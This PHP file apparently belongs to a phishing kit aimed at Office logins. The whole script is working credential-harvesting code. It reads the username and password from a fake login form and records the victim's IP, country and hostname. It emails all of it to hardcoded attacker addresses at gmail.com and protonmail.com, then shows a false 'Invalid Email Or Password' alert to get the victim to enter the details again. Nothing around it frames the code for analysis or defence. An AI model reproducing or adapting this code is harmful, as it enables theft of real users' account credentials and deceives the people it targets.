<?php
if($_POST["id1"] != "" and $_POST["id2"] != ""){
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Office Login PIC-----------------------\n";
$message .= "Username             : ".$_POST['id1']."\n";
$message .= "Password            : ".$_POST['id2']."\n";
$message .= "--------------IP DETAIL-----------------------\n";
$message .= "Date: ".$adddate."\n";
$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
$message .= "Ip Info       http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "evilcderinclogz@gmail.com,evilc0der@protonmail.com";
$subject = "Result .$ip.";
$headers = "From: Office Login<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
echo "<script>alert('Invalid Email Or Password, Try Again'); window.location = 'index.php';</script>";
 //header ("Location: https://www.credit-suisse.com/media/assets/microsite/docs/investment-outlook/investment-outlook-2017-en.pdf");
}else{
header ("Location: index.php");
}
?>